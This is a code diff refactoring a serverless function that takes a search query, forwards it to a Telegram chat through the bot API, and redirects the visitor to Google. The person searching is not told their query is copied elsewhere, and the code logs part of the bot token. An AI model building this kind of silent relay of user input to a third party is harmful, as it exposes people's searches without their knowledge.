@@ -1,82 +1,58 @@
 'use strict';
 
-const https = require('https');
 const { URLSearchParams } = require('url');
 
 const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-function sendTelegram(text) {
-  return new Promise((resolve) => {
-    const body = JSON.stringify({ chat_id: CHAT_ID, text });
-
-    const req = https.request(
-      {
-        hostname: 'api.telegram.org',
-        path: `/bot${BOT_TOKEN}/sendMessage`,
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Content-Length': Buffer.byteLength(body),
-        },
-      },
-      (res) => { res.resume(); resolve(); }
-    );
-
-    req.on('error', () => resolve());
-    req.setTimeout(5000, () => { req.destroy(); resolve(); });
-    req.write(body);
-    req.end();
+async function sendTelegram(text) {
+  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+  await fetch(url, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text }),
+    signal: AbortSignal.timeout(5000),
   });
 }
 
-function readBody(req) {
-  return new Promise((resolve) => {
-    // Safety timeout — if the stream never fires (already consumed), resolve empty
-    const timeout = setTimeout(() => resolve(''), 3000);
-    let data = '';
-    req.on('data', (chunk) => { data += chunk; });
-    req.on('end', () => { clearTimeout(timeout); resolve(data); });
-    req.on('error', () => { clearTimeout(timeout); resolve(''); });
-  });
-}
-
-function extractQuery(body) {
-  if (!body) return '';
-  if (Buffer.isBuffer(body)) body = body.toString('utf8');
-  if (typeof body === 'object') return String(body.q || '').trim();
-  if (typeof body === 'string') {
-    const params = new URLSearchParams(body);
-    return (params.get('q') || '').trim();
+async function getQuery(req) {
+  // Vercel may pre-parse the body into req.body
+  if (req.body !== undefined && req.body !== null) {
+    if (typeof req.body === 'object' && !Buffer.isBuffer(req.body)) {
+      return String(req.body.q || '').trim();
+    }
+    const raw = Buffer.isBuffer(req.body) ? req.body.toString('utf8') : String(req.body);
+    return (new URLSearchParams(raw).get('q') || '').trim();
   }
-  return '';
+  // Otherwise read the stream directly
+  const chunks = [];
+  for await (const chunk of req) chunks.push(chunk);
+  const raw = Buffer.concat(chunks).toString('utf8');
+  return (new URLSearchParams(raw).get('q') || '').trim();
 }
 
 module.exports = async (req, res) => {
   console.log('BOT_TOKEN:', BOT_TOKEN ? BOT_TOKEN.slice(0, 10) + '...' : 'MISSING');
   console.log('CHAT_ID:', CHAT_ID || 'MISSING');
+
   let query = '';
   try {
-    // req.body is set by Vercel if it pre-parsed the body; otherwise read the stream
-    if (req.body !== undefined && req.body !== null) {
-      query = extractQuery(req.body);
-    } else {
-      const raw = await readBody(req);
-      query = extractQuery(raw);
-    }
+    query = await getQuery(req);
+    console.log('query:', query);
   } catch (err) {
-    // always redirect even if parsing fails
+    console.error('getQuery error:', err.message);
   }
 
-  // Await Telegram so the serverless function doesn't get frozen mid-request
   if (query) {
-    await sendTelegram(query).catch(() => {});
+    try {
+      await sendTelegram(query);
+      console.log('Telegram: sent');
+    } catch (err) {
+      console.error('Telegram error:', err.message);
+    }
   }
 
-  const googleUrl =
-    'https://www.google.com/search?' +
-    new URLSearchParams({ q: query }).toString();
-
+  const googleUrl = 'https://www.google.com/search?' + new URLSearchParams({ q: query });
   res.writeHead(302, { Location: googleUrl });
   res.end();
 };
